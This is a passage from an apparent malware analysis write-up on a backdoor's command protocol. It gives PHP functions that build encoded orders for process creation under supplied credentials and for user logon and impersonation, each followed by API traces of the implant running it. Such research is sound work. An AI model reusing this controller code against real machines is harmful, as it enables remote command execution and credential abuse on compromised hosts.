	$username_le16 = UConverter::transcode($username, 'UTF-16LE', 'UTF-8');
	$username_b64 = base64_encode($username_le16);
	
	$cmd_id = "\x84\xf5 $domain $username_b64 $password $AppName $CommandLine";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [361]
[PTP] [0xbbc] [0xbd4] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000001AEF3853B0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+fNvASMwfZwziwDq+MmBh9FEddAkx0dfTFLvWGSIeJ6GJcVjCtJlyd7WYSICCDrHyJLAP7raAeOYET7zkWP7ie4FQ"
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000001AEF399130
[PAR] DWORD   *pcbBinary : 0x0000001AF131E81C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x1af127bea1]
```

**II. Execution**   

```html
[CNT] [379]
[PTP] [0xbbc] [0xbd4] [c:\windows\system32\rundll32.exe]
[API] <CreateProcessWithLogonW> in [ADVAPI32.dll] 
[PAR] LPCWSTR               lpUsername           : 0x0000001AEF38C2D0
[STR]                       -> "Riri"
[PAR] LPCWSTR               lpDomain             : 0x0000001AEF38C830
[STR]                       -> "Domain.com"
[PAR] LPCWSTR               lpPassword           : 0x0000001AEF38C370
[STR]                       -> "azerty"
[PAR] DWORD                 dwLogonFlags         : 0x1
[PAR] LPCWSTR               lpApplicationName    : 0x0000001AEF38C770
[STR]                       -> "AAAA"
[PAR] LPWSTR                lpCommandLine        : 0x0000001AEF38C730
[STR]                       -> "BBBB"
[PAR] DWORD                 dwCreationFlags      : 0x8000000
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCWSTR               lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOW        lpStartupInfo        : 0x0000001AF131E6C8
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x0000001AF131E6B0
[RET] [0x1af128c054]
```

**III. Result (failed)**   

```html
[CNT] [389]
[PTP] [0xbbc] [0xbd4] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000001AEF38C8F0
[STR]        -> "9999"
[STR]           "1326"
[PAR] DWORD  cbBinary   : 0x12
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000001AEF386680
[PAR] DWORD* pcchString : 0x0000001AF131E4FC
[RET] [0x1af127e028]
```

<a id="LogonUserW"></a>
# LogonUserW

The first parameter ($type) of this command has to be either "local" or "network"  

```php
function LogonUserW($type, $domain, $username, $password)
{
	$username_le16 = UConverter::transcode($username, 'UTF-16LE', 'UTF-8');
	$username_b64 = base64_encode($username_le16);
	
	$cmd_id = "\x99\xf9 $type $domain $username_b64 $password";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [327]
[PTP] [0xab4] [0xab0] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x0000006D5E8EDB80
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ee3+SPwfZxLiwCGsH0oW9mkddDQ+tNeSFLvaBSIeL52JcVjCiZlMd7WRJ4jna7bHFtg="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x0000006D5E8FA700
[PAR] DWORD   *pcbBinary : 0x0000006D6086E60C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x6d607cbea1]
```

**II. Execution**   

```html
[CNT] [354]
[PTP] [0xab4] [0xab0] [c:\windows\system32\rundll32.exe]
[API] <LogonUserW> in [ADVAPI32.dll] 
[PAR] LPCWSTR  lpUsername      : 0x0000006D5E903D10
[STR]          -> "user"
[PAR] LPCWSTR  lpDomain        : 0x0000006D5E903930
[STR]          -> "home"
[PAR] LPCWSTR  lpPassword      : 0x0000006D5E903A50
[STR]          -> "user"
[PAR] DWORD    dwLogonType     : 0x2
[PAR] DWORD    dwLogonProvider : 0x0
[PAR] PHANDLE  phToken         : 0x0000006D6087ACC0
[RET] [0x6d607d4396]

[CNT] [355]
[PTP] [0xab4] [0xab0] [c:\windows\system32\rundll32.exe]
[API] <ImpersonateLoggedOnUser> in [ADVAPI32.dll] 
[PAR] HANDLE  hToken : 0x2e4
[RET] [0x6d607d43a8]
```

**III. Result**   

```html
[CNT] [370]
[PTP] [0xab4] [0xab0] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000006D5E90D240
[STR]        -> "99F9"
[STR]           "home\user"
[PAR] DWORD  cbBinary   : 0x1c
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x0000006D5E9018A0
[PAR] DWORD* pcchString : 0x0000006D6086E3FC
[RET] [0x6d607ce028]
```
